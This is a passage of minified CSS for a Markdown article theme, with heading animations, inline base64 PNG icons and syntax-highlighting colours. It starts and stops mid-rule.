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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAdCAYAAABcz8ldAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAhgSURBVGhD7Zp7bBTHHcdn33t7vvOdzy+ITVKDU0xIKG2ABCPTRCCaUiEVKWoqRJuASAhCitRCVKSoalFUKZBiSmmFRRJKRUnUtIpo+aNqGgwoOCmuFUIRzxjwE4zte+97drYzztji8HPvtkit/PnH+n1397Tz+83vN/PbMZhmmmmm+d+BoX8n5diihcGqgFQf5vk6BMAskWUlw3GyFnIvtqWSf91w7mKC3npfOLX7wYeiIa6BBWCOLLFRF2NB0JvIOP/80YG+k2ev6S699b/OzOfKBW5l5KsgyC4DCFQDnpEAdE1goc/dlNPc/Up7P711UiYNSMuyxeUzZPnHgGHWh5XADEkSAcdiN+AnEXIBhBComgFU0/xQR+jnj51sOUMf9Z0NKyL8S9+JPBEN8zuCMrsqGOA5QWAAyzLAxe53HBeYFgJp1c5Cx33nyIfpV3e+22/Sx32nev/sMCgVnmM4bjOniAtZWQAsz315EfsGQQc4hgWcjHkCmOj1rheuNn95cXwmDMiVp5etC/D8m5FwUWVQUYYGPh6mZYFUOgsGVa1pXvOZzVT2jRuH54RM230jEuI3RcIiL4l4UkxAJmuD/riVsqD7ct2m9nep7BtVTbVfZ0uE/UIk+CQflAHDjf8+Lg6MldYATGpH3c/Ul7p3dWXppVGM6eElJSHmnQWPbSlRlN1lJcUBjqNRnwJZVQO3B5P/uq5rK1d90pakckFcaKp5UJHY92JR8YlwkUDVySEZfGfQdO7E7Z8s2HL9TSoXTPXRud9nA8IBqSwcZgWeqpPj6BYw7yTbXBN9q2v9lQEq5zBmWA8vWLCptCi4tzwW8RQMQlFQATPLSh6vCSh/plJBkMyQBHZfWYnkKRgEktEVpTJXERN2Xzo4ex2VC6K6qXYpF5b3ypVRT8EgcAERSJXRbwCBOTFzXblM5RxGBaRt+ZPYA+LO0mgxz5K1Ig+UgAzKIuGnz39z6S+olDeaibaXRsU1RUFvgx+GwTWgPCaDgMw2XXpr9gwq50XV0bkxJiYeEiNF5cwE5XsiOEkAUkXkUW51SSOVchjl8WKef604XFSRbzCGCYeCoESStv/p8QU1VPIM3knNDynctnBRfsEYhgSlNCIGgQv2UCkvGIHZgteMh1nBW9W4F16RAM6yDVV7amZTaYQcr59cuuhhWRTWBvAMLxQGeyFSHOLnh0MvUskz5RF+fbRYDEy0mZgqQYUHOLhr//b6rGoqeaLqQG0pw3PrBbyA+4EQUkRmhvgqNUfICUipKK4OKUqIJVPKB0jpEhjmWWp64jdbKmVZZNYogcJm493gsifOqhDyeh9GYR/FM7sW+DA5CKR0MSK3tvKZkpwB5gRE4tjFEr7RL0iWBGV51vHFCyupNGWWPqLgnoer9mtyEGSJAzwLllDTGzyznDjRN/CwOFkoFb4bm0eVIXICgpvdGoEvrF7fC89zfLkkeV5HbOhWiTwTpKYvCAJLGshRdXtKMKAWlyxq+MPQLk1h66g5RE5ABJYNFrqY3wvJklJRUKg5ZWLFXIA86yek2uDOPkBNb3CM5Pf7DL2QyIrUGiLH+xC5Bmmm/ARnHUhC6PnzxWDK0RH5HuIjZGy27erU9AZ0dTIWXyG+NpBBrSFySxZw220IqeUPFoS6jVAPNadM7yDsgNB1qOkLuAziMYIb1PQGA75wIaKGPyAb+9oF16g5RE5ALIQ+tSyLWoWDEAK6aXW3JlK9VJoyx1oyvVkNdvo5KXXDAVkdnaKmNwx0xjH98w3JNmTCm+Bc9hKVhsgJSI9pvp9Vdd++jmq6AXB2/HHrhcs5aTkVDv0DFzoHvKdq/mQsKX/4t7KJLDpOJW+IbAvMGoMkxfwAWZB8DT7W1diTE+WcgKz6pK1bs6z3daPwmJDsSKt6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 